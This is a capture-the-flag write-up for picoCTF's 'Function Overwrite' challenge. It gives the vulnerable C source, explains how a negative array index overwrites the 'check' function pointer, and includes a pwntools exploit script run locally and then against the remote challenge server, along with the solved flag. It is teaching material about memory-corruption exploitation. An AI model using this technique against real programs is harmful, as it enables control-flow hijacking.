Function Overwrite

![][image1]

In this challenge we got 2 files, 1 binary and other as source code

\#include \<stdio.h\>  
\#include \<stdlib.h\>  
\#include \<string.h\>  
\#include \<unistd.h\>  
\#include \<sys/types.h\>  
\#include \<wchar.h\>  
\#include \<locale.h\>

\#define BUFSIZE 64  
\#define FLAGSIZE 64

int calculate\_story\_score(char \*story, size\_t len)  
{  
  int score \= 0;  
  for (size\_t i \= 0; i \< len; i\++)  
  {  
    score \+= story\[i\];  
  }

  return score;  
}

void easy\_checker(char \*story, size\_t len)  
{  
  if (calculate\_story\_score(story, len) \== 1337)  
  {  
    char buf\[FLAGSIZE\] \= {0};  
    FILE \*f \= fopen("flag.txt", "r");  
    if (f \== NULL)  
    {  
      printf("%s %s", "Please create 'flag.txt' in this directory with your",  
                      "own debugging flag.\\n");  
      exit(0);  
    }

    fgets(buf, FLAGSIZE, f); // size bound read  
    printf("You're 1337\. Here's the flag.\\n");  
    printf("%s\\n", buf);  
  }  
  else  
  {  
    printf("You've failed this class.");  
  }  
}

void hard\_checker(char \*story, size\_t len)  
{  
  if (calculate\_story\_score(story, len) \== 13371337)  
  {  
    char buf\[FLAGSIZE\] \= {0};  
    FILE \*f \= fopen("flag.txt", "r");  
    if (f \== NULL)  
    {  
      printf("%s %s", "Please create 'flag.txt' in this directory with your",  
                      "own debugging flag.\\n");  
      exit(0);  
    }

    fgets(buf, FLAGSIZE, f); // size bound read  
    printf("You're 13371337\. Here's the flag.\\n");  
    printf("%s\\n", buf);  
  }  
  else  
  {  
    printf("You've failed this class.");  
  }  
}

void (\*check)(char\*, size\_t) \= hard\_checker;  
int fun\[10\] \= {0};

void vuln()  
{  
  char story\[128\];  
  int num1, num2;

  printf("Tell me a story and then I'll tell you if you're a 1337 \>\> ");  
  scanf("%127s", story);  
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10\.\\n");  
  scanf("%d %d", &num1, &num2);

  if (num1 \< 10)  
  {  
    fun\[num1\] \+= num2;  
  }

  check(story, strlen(story));  
}  
   
int main(int argc, char \*\*argv)  
{

  setvbuf(stdout, NULL, \_IONBF, 0);

  // Set the gid to the effective gid  
  // this prevents /bin/sh from dropping the privileges  
  gid\_t gid \= getegid();  
  setresgid(gid, gid, gid);  
  vuln();  
  return 0;  
}

At this challenge i just need to find the offset then i need to find pointer offset in hard\_checker function

So how to find the offset?  
To find the offset i need to substrack function ‘check’ from the ‘fun’ function  
Then divided them by 4

Then how about  pointer offset?  
![][image2]

We need to substrack 0x08049465 from 0x08049436  
![][image3]  
So we have 0x2f which mean 47  
![][image4]

Ok now we just need make the solver   
from pwn import \*

elf \= context.binary \= ELF('./vuln',checksec\=False)  
p \= process(elf.path)

def main():  
    fun \= elf.symbols\['fun'\]  
    log.info(f'fun : {hex(fun)}')  
    check \= elf.symbols\['check'\]  
    log.info(f'check : {hex(check)}')  
    offset \= int((check \- fun)/4)  
    log.info(f'offset : {offset}')  
    offset\_pointer \= 0x08049465 \- 0x08049436  
    log.info(f'offset\_pointer : {offset\_pointer}')

    payload \= f'{offset} {offset\_pointer}'  
    print(payload)

    p.sendlineafter('\>\>', b'neuvillete')  
    p.sendlineafter('\\n', payload)

    p.interactive()

if \_\_name\_\_ \== '\_\_main\_\_':  
    main()    

![][image5]

Then we got the flag test and the final step we’ll remote the program  
from pwn import \*

elf \= context.binary \= ELF('./vuln',checksec\=False)  
p \= process(elf.path)  
p \= remote('saturn.picoctf.net', 57516)

def main():  
    fun \= elf.symbols\['fun'\]  
    log.info(f'fun : {hex(fun)}')  
    check \= elf.symbols\['check'\]  
    log.info(f'check : {hex(check)}')  
    offset \= int((check \- fun)/4)  
    log.info(f'offset : {offset}')  
    offset\_pointer \= 0x08049465 \- 0x08049436  
    log.info(f'offset\_pointer : {offset\_pointer}')

    payload \= f'{offset} {offset\_pointer}'  
    print(payload)

    p.sendlineafter('\>\>', b'neuvillete')  
    p.sendlineafter('\\n', payload)

    p.interactive()

if \_\_name\_\_ \== '\_\_main\_\_':  
    main()      
![][image6]  
Bom we got the flag

Flag : picoCTF{0v3rwrit1ng\_P01nt3rs\_cc9ab5fc}
